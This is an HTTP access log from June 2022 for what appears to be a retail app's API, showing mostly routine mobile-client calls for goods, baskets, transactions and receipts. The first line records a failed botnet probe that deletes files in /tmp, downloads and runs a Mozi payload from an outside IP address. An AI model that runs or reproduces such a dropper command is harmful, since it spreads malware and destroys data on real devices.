::1 - - [29/Jun/2022:00:05:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.95.92.74:33693/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 144 "-" "Hello, world"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:53 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:53 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:53 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:07:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:07:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:08:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:08:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:08:08 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:09:23 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:09:37 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:09:58 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:10:14 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:12 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:31 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::1 - - [29/Jun/2022:09:11:41 +0000] "POST /api/v1/goods HTTP/1.0" 200 347 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:41 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:42 +0000] "PUT /api/v1/goods/62bc174df4282e7602a281e1/upload-photo HTTP/1.0" 200 60 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:42 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 914 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:42 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 394 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:48 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 243 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:52 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 915 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 915 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:54 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:11:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:11:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:00 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:04 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 680 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 680 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:09 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 243 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:12 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 915 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 915 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:17 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:17 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:25 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:29 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 243 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:32 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 915 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 915 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:12:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:34 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:12:40 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 200 2044 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:13:04 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:13:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:13:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:13:07 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 245 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:13:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:13:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:13:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:13:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 914 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:13:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 914 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:13:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:13:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:13:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:13:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:13:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:13:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:13:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:14 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:16 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:24 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 392 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:28 +0000] "POST /api/v1/transactions HTTP/1.0" 200 255 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 680 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 680 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:34 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 243 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:34 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 916 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 916 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:39 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:44 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:44 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:44 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:15:45 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 200 3208 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:15:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:18:06 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:21:28 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:21:32 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:22:00 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:31:23 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:31:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:31:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:31:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:31:56 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:31:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:32:24 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:09:32:33 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:09:32:36 +0000] "GET /api/v1/transactions/user?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
